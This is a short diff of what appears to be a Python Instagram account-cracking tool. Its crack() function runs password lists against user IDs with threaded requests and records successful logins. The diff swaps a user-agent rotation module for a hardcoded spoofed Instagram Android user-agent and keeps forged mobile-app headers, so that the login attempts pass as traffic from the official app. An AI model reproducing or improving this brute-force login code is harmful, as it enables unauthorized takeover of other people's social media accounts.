@@ -18,7 +18,6 @@ import string
 import os
 import threading
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from database.useragent_instagram import Useragent
 # Global variables with proper initialization
 loop = 0
 oks = []
@@ -158,7 +157,6 @@ def crack(uid, password_list, total_count):
             
             # Create session and generate device hash
             session = requests.Session()
-            useragent = Useragent().useragent_instagram()
             device_hash = generate_device_hash(uid, pw)
             headers = {
             'host': 'i.instagram.com',
@@ -178,7 +176,7 @@ def crack(uid, password_list, total_count):
             'x-ig-connection-type': 'MOBILE(LTE)',
             'x-ig-capabilities': '3brTv10=',
             'priority': 'u=3',
-            'user-agent': useragent,
+            'user-agent': 'Instagram 312.1.0.34.111 Android (30/11; 320dpi; 720x1472; INFINIX MOBILITY LIMITED/Infinix; Infinix X688B; Infinix-X688B; mt6765; en_US; 548323754)',
             'accept-language': 'id-ID, en-US',
             'x-mid': '',
             'ig-intended-user-id': '0',
